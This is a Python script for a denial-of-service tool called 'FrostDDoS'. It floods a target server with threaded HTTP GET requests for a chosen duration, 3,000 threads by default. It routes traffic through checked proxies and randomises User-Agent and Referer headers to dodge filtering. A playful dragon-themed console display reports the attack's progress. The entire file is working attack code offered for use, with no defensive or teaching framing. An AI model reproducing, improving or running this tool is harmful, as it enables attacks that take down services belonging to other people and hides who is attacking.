import shutil
import sys
import time
import socket
import threading
import random
from argparse import ArgumentParser
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests

def random_color():
    return f"\033[38;2;{random.randint(0, 255)};{random.randint(0, 255)};{random.randint(0, 255)}m"

def print_centered(text, scale=1):
    terminal_width = shutil.get_terminal_size().columns
    scaled_width = terminal_width // scale
    for line in text.split('\n'):
        left_padding = (scaled_width - len(line)) // 2
        print(random_color() + " " * left_padding + line + "\033[0m")

def random_user_agent():
    with open("useragents.txt", "r") as file:
        user_agents = file.read().splitlines()
    return random.choice(user_agents)

def random_referer():
    with open("referers.txt", "r") as file:
        referers = file.read().splitlines()
    return random.choice(referers)

def check_proxy(proxy):
    try:
        proxy_host, proxy_port = proxy.split(':')
        with socket.create_connection((proxy_host, int(proxy_port)), timeout=5):
            return True
    except Exception:
        return False

successful_attacks = 0
failed_attacks = 0
counter_lock = threading.Lock()

dragon_names = [
    "Smaug", "Draco", "Toothless"
]

def attack(host, port, duration, proxy=None):
    global successful_attacks, failed_attacks
    end_time = time.time() + duration
    try:
        if proxy:
            proxy_host, proxy_port = proxy.split(':')
            with socket.create_connection((proxy_host, int(proxy_port))) as conn:
                conn.settimeout(1)
                while time.time() < end_time:
                    packet = f"GET / HTTP/1.1\nHost: {host}\nReferer: {random_referer()}\nUser-Agent: {random_user_agent()}\n\n".encode('utf-8')
                    conn.sendall(packet)
                    with counter_lock:
                        successful_attacks += 1
        else:
            with socket.create_connection((host, port)) as conn:
                conn.settimeout(1)
                while time.time() < end_time:
                    packet = f"GET / HTTP/1.1\nHost: {host}\nReferer: {random_referer()}\nUser-Agent: {random_user_agent()}\n\n".encode('utf-8')
                    conn.sendall(packet)
                    with counter_lock:
                        successful_attacks += 1
    except Exception as e:
        with counter_lock:
            failed_attacks += 1

def dos(host, port, thr, duration, proxy_list=None):
    with ThreadPoolExecutor(max_workers=thr) as executor:
        futures = []
        if proxy_list:
            for proxy in proxy_list:
                futures.append(executor.submit(attack, host, port, duration, proxy))
        else:
            for _ in range(thr):
                futures.append(executor.submit(attack, host, port, duration))
        
        for future in as_completed(futures):
            future.result()

def get_parameters():
    parser = ArgumentParser(description="FrostDDoS - Coded by FrostFoe")
    parser.add_argument("-s", "--server", dest="host", required=True, help="Attack to server IP -s IP")
    parser.add_argument("-p", "--port", type=int, dest="port", default=80, help="Port (default 80)")
    parser.add_argument("-t", "--turbo", type=int, dest="turbo", default=300, help="Turbo (default 300)")
    parser.add_argument("-d", "--duration", type=int, dest="duration", default=60, help="Duration of attack in seconds (default 60)")
    parser.add_argument("--proxy", dest="proxy_file", help="Optional proxy file")
    args = parser.parse_args()
    return args

def print_report(duration):
    global successful_attacks, failed_attacks
    start_time = time.time()
    while time.time() - start_time < duration:
        current_time = time.ctime(time.time())
        dragon_name = random.choice(dragon_names)
        print(f"{random_color()}{current_time}\033[0m {random_color()} <--Fireball sent by {dragon_name}!🐲🔥💥 (Successful Attacks: {successful_attacks}, Failed Attacks: {failed_attacks})\033[0m")
        time.sleep(1)

if __name__ == '__main__':
    args = get_parameters()
    host = args.host
    port = args.port
    thr = args.turbo * 10
    duration = args.duration
    proxy_file = args.proxy_file

    print(f"{random_color()}", host, "Port: ", str(port), "Turbo: ", str(thr), "Duration: ", str(duration), "\033[0m")
    print(f"{random_color()}Let the Dragon's Wrath begin...🔥🐉💥🌋\033[0m")

    proxy_list = []
    if proxy_file:
        with open(proxy_file, 'r') as f:
            proxies = [line.strip() for line in f.readlines()]
        for proxy in proxies:
            if check_proxy(proxy):
                proxy_list.append(proxy)
        print(f"{random_color()}Using {len(proxy_list)} online proxies from {proxy_file}\033[0m")
    else:
        print(f"{random_color()}No proxies specified, proceeding without proxies\033[0m")

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, int(port)))
            s.settimeout(1)
    except Exception as e:
        print(f"\033[91mCheck server IP and port: {e}\033[0m")
        sys.exit()

    for i in range(3, 0, -1):
        print(f"{random_color()}Starting attack in {i}...\033[0m")
        time.sleep(1)
    print(f"{random_color()}Attack started!\033[0m")

    dos_thread = threading.Thread(target=dos, args=(host, port, thr, duration, proxy_list if proxy_list else None))
    report_thread = threading.Thread(target=print_report, args=(duration,))

    dos_thread.start()
    report_thread.start()

    dos_thread.join()
    report_thread.join()

    print(f"{random_color()}Attack ended. Total successful attacks: {successful_attacks}, Total failed attacks: {failed_attacks}\033[0m")
